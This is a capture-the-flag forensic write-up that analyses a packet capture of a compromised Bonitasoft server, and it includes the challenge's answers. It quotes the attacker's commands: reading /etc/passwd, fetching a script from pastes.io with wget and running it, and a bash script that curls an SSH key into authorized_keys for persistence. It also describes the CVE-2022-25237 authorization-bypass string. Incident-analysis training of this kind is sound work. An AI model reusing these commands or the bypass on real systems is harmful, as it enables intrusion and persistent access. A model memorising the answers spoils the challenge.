## We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?

- filter for `http` in Wireshark 
- notice URL contains **bonita**
- open JSON alerts file and search for `bonita` to find entries for **Bonitasoft** (confirm with web search if desired)

### Answer: `bonitasoft`

## We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?

- filter for `http.request.method=="POST"` and notice the numeroud logins

- expand the form information to see different usernames and passwords

- looks like **credential stuffing** 

### Answer: `Credential Stuffing`

## Does the vulnerability exploited have a CVE assigned - and if so, which one?

- If you searched the JSON alerts file for Bonitasoft you likely already saw a CVE number such as this line (and others): 

```
ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)"
```

- One can also do a web search for "Bonitasoft credential stuffing" (or similar) and/or the above CVE number and check the results e.g. NVD page

### Answer: `CVE-2022-25237`

## Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?

<p>The NVD description (https://nvd.nist.gov/vuln/detail/CVE-2022-25237) will have this information and we can verify
in the PCAP file</p>

Filter: 

```
http.request.method=="POST" && http.request.uri contains "i18ntranslation"
```

### Answer: `i18ntranslation`

## How many combinations of usernames and passwords were used in the credential stuffing attack?

- Let's look at all the form submissions

Filter:
```
http.content_type == "application/x-www-form-urlencoded"
```

- Taking a closer look at a few results one can see that each one is followed by another showing **install:install**, so let's remove those

Filter:

```
http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.value != "install"
```

- This leaves 59 packets but if looking at the last three one can see the same credentials (**seb.broom@forela.co.uk:g0vernm3nt
**) indicating a change
- checking the response comfirms that this credential was successful with a 204 response rather than 401

- There are 4 packets in the filtered output associated with the successful request meaning that 56 unique username:password attempts were made

### Answer: `56`

## Which username and password combination was successful?

- As discovered above `seb.broom@forela.co.uk:g0vernm3nt` was the successful username:password pair

### Answer: `seb.broom@forela.co.uk:g0vernm3nt`

## If any, which text sharing site did the attacker utilise?

After successful authentication the attacket makes a POST request to upload **"rce_api_extension.zip"** then follows up with a few GET requests including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"*** then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**

### Answer: `pastes.io`

## Please provide the filename of the public key used by the attacker to gain persistence on our host.

Following the link that the wget command used leads to a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and restart the SSH service

```    
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

### Answer: `hffgra4unv`

## Can you confirmed the file modified by the attacker to gain persistence?

As seen above, the modified file is the **authorized_keys** file which has a new key appended to it

### Answer: `/home/ubuntu/.ssh/authorized_keys`

## Can you confirm the MITRE technique ID of this type of persistence mechanism?

Using the ATT&CK Navigator and creating a new layer with the Enterprise matrix (https://mitre-attack.github.io/attack-navigator/) a simple search on **SSH** quickly reveals a result **"Account Manipulation : SSH Authorized Keys"**. Clicking view opens the description (https://attack.mitre.org/techniques/T1098/004/) which includes the ID 

### Answer: `T1098.004`